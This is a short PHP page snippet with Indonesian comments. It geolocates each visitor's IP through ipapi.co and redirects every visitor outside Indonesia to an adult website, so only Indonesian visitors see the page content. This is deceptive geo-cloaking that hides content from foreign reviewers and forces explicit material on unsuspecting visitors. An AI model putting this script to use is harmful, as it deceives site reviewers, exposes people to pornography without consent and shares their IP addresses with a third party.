<?php
// Mendapatkan IP pengunjung
$ipAddress = $_SERVER['REMOTE_ADDR'];

// URL API dengan IP pengunjung
$apiUrl = "https://ipapi.co/{$ipAddress}/json/";

// Lakukan panggilan CURL ke API
$curl = curl_init($apiUrl);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);

// Decode JSON response
$ipDetails = json_decode($response, true);

// Cek jika API berhasil mendapatkan data
if (!empty($ipDetails) && isset($ipDetails['country_code'])) {
    // Redirect jika pengunjung bukan dari Indonesia
    if ($ipDetails['country_code'] !== 'ID') {
        header('Location: http://xnxx.com');
        exit;
    }
} else {
    // Handle error atau default behavior
    error_log('Failed to retrieve IP details');
}

// Konten utama halaman Anda
?>
